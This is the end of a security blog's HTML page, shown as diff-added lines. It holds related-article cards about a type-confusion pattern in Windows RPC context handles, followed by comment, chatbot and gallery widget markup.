+		<a class="cover" href="https://core-jmp.org/2026/06/from-context-handle-to-type-confusion-windows-rpc-2/"><img width="900" height="900" src="https://core-jmp.org/wp-content/uploads/2026/06/W65C816S_Machine_Code_Monitor-1024x1024.jpeg" class="attachment-large size-large wp-post-image" alt="From context_handle to type confusion: A Windows RPC Vulnerability Pattern" loading="lazy" decoding="async"><span class="cat">Reverse Engineering</span><span class="views"><span class="views-inline"><svg class="eye" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7z"></path><circle cx="12" cy="12" r="2.6"></circle></svg>123</span></span></a>		<div class="body">
+			<div class="tags"><a class="tag" href="https://core-jmp.org/security/reverse-engineering/">Reverse Engineering</a><a class="tag" href="https://core-jmp.org/security/vulnerability-analysis/">Vulnerability Analysis</a></div>
+			<h3><a href="https://core-jmp.org/2026/06/from-context-handle-to-type-confusion-windows-rpc-2/">From context_handle to type confusion: A Windows RPC Vulnerability Pattern</a></h3>
+			<p>A walkthrough of a recurring type-confusion pattern in Windows RPC servers: when an interface accepts an FC_BINDING_CONTEXT handle without checking its object…</p>
+			<div class="foot">
+				<span>oxfemale</span><span>·</span>
+				<span>Jun 29</span><span>·</span>
+				<span>9 min</span>
+				<span>·</span><span class="views-inline"><svg class="eye" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7z"></path><circle cx="12" cy="12" r="2.6"></circle></svg>123</span>			</div>
+		</div>
+	</article>
+		<article class="card">
+		<a class="cover" href="https://core-jmp.org/2026/06/from-context-handle-to-type-confusion-windows-rpc/"><img width="900" height="900" src="https://core-jmp.org/wp-content/uploads/2026/06/Computersicherheit-1024x1024.jpg" class="attachment-large size-large wp-post-image" alt="From context_handle to type confusion: A Type Confusion Pattern in Windows RPC Servers" loading="lazy" decoding="async"><span class="cat">RPC</span><span class="views"><span class="views-inline"><svg class="eye" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7z"></path><circle cx="12" cy="12" r="2.6"></circle></svg>86</span></span></a>		<div class="body">
+			<div class="tags"><a class="tag" href="https://core-jmp.org/security/windows/rpc/">RPC</a><a class="tag" href="https://core-jmp.org/security/vulnerability-analysis/">Vulnerability Analysis</a></div>
+			<h3><a href="https://core-jmp.org/2026/06/from-context-handle-to-type-confusion-windows-rpc/">From context_handle to type confusion: A Type Confusion Pattern in Windows RPC Servers</a></h3>
+			<p>Many Windows RPC servers expose several context-handle types under one interface. When the IDL marks a handle as FC_BIND_CONTEXT (0x70) instead of…</p>
+			<div class="foot">
+				<span>oxfemale</span><span>·</span>
+				<span>Jun 27</span><span>·</span>
+				<span>9 min</span>
+				<span>·</span><span class="views-inline"><svg class="eye" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7z"></path><circle cx="12" cy="12" r="2.6"></circle></svg>86</span>			</div>
+		</div>
+	</article>
+	</div></section>
+						<section class="cjmp-comments" id="cjmp-comments">
+		<div class="eyebrow"><span class="addr">//</span> Discussion</div>
+		<div class="cjmp-giscus"><div class="giscus"><div class="giscus-frame giscus-frame--loading" title="Comments" scrolling="no" allow="clipboard-write" src="cid:frame-54FB3084EE7E9BF39C7DBEC1D07D416F@mhtml.blink" loading="lazy" style="opacity: 0;" data-original-tag="iframe"></div></div></div>
+	</section>
+	
+			
+	</div><!-- /.article-wrap -->
+	</main><!-- /#main -->
+
+
+
+<!-- search overlay -->
+
+
+</div><!--! /#inner-body -->
+
+
+<div class="mwai-chatbot-container" data-mwai-initialized="true"><div class="mwai-chat mwai-bottom-right mwai-window mwai-animation-zoom mwai-chatgpt-theme mwai-transition mwai-transition-visible" dir="auto" id="mwai-chatbot-default" style="max-height: calc(100% - 20px);"><div class="mwai-trigger mwai-open-button"><div class="mwai-icon-container" role="button" tabindex="0" aria-label="AI Engine Chatbot"><img class="mwai-icon" width="64" height="64" alt="AI Engine Chatbot" src="https://core-jmp.org/wp-content/plugins/ai-engine/images/chat-traditional-1.svg"></div></div><div class="mwai-window-box"><div class="mwai-header" role="toolbar" aria-label="Chat header"><div class="mwai-buttons"><div class="mwai-close-button"></div></div></div><div class="mwai-body"><div class="mwai-conversation"><div class="mwai-reply mwai-ai mwai-rendered"><span class="mwai-name"><div class="mwai-name-text">AI:</div></span><div><span class="mwai-text"><span>Hi! How can I help you?</span></span></div></div></div><div class="mwai-input mwai-active"><div class="mwai-input-text"><div class="mwai-file-upload" style="cursor: pointer;"><div class="mwai-file-upload-icon mwai-idle-idle mwai-lucide mwai-chatgpt-upload"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-plus"><path d="M5 12h14"></path><path d="M12 5v14"></path></svg></div><input type="file" style="display: none;"></div><textarea placeholder="Type your message..." maxlength="512" style="height: 15px !important;"></textarea></div><button class="mwai-input-submit"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-up"><path d="m5 12 7-7 7 7"></path><path d="M12 19V5"></path></svg></button></div><div class="mwai-footer"></div></div></div></div></div>
+	
+				
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true"><div class="pswp__bg"></div><div class="pswp__scroll-wrap"><div class="pswp__container"><div class="pswp__item"></div><div class="pswp__item"></div><div class="pswp__item"></div></div><div class="pswp__ui pswp__ui--hidden"><div class="pswp__top-bar"><div class="pswp__counter"></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button><button class="pswp__button pswp__button--share" title="Share"></button><button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button><button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class="pswp__preloader"><div class="pswp__preloader__icn"><div class="pswp__preloader__cut"><div class="pswp__preloader__donut"></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class="pswp__share-tooltip"></div> </div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button><button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class="pswp__caption"><div class="pswp__caption__center"></div></div></div></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+	<div src="https://widgets.wp.com/likes/master.html?ver=20260809#ver=20260809" scrolling="no" id="likes-master" name="likes-master" style="display:none;" data-original-tag="iframe">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div src="https://public-api.wordpress.com/wp-admin/rest-proxy/#https://widgets.wp.com" style="display: none;" data-original-tag="iframe">
+
+
+
+
+
+
+</div></div>
+	<div id="likes-other-gravatars" role="dialog" aria-hidden="true" tabindex="-1"><div class="likes-text"><span>%d</span></div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
+	
+
+<textarea tabindex="-1" aria-hidden="true" style="min-height: 0px !important; max-height: none !important; height: 0px !important; visibility: hidden !important; overflow: hidden !important; position: absolute !important; z-index: -1000 !important; top: 0px !important; right: 0px !important; display: block !important; border-width: 1px; box-sizing: content-box; font-family: monospace; font-size: 13.3333px; font-style: normal; font-weight: 400; letter-spacing: normal; line-height: normal; padding: 2px; tab-size: 8; text-indent: 0px; text-rendering: auto; text-transform: none; width: 175px; word-break: normal; word-spacing: 0px; scrollbar-gutter: auto;"></textarea></body></html>
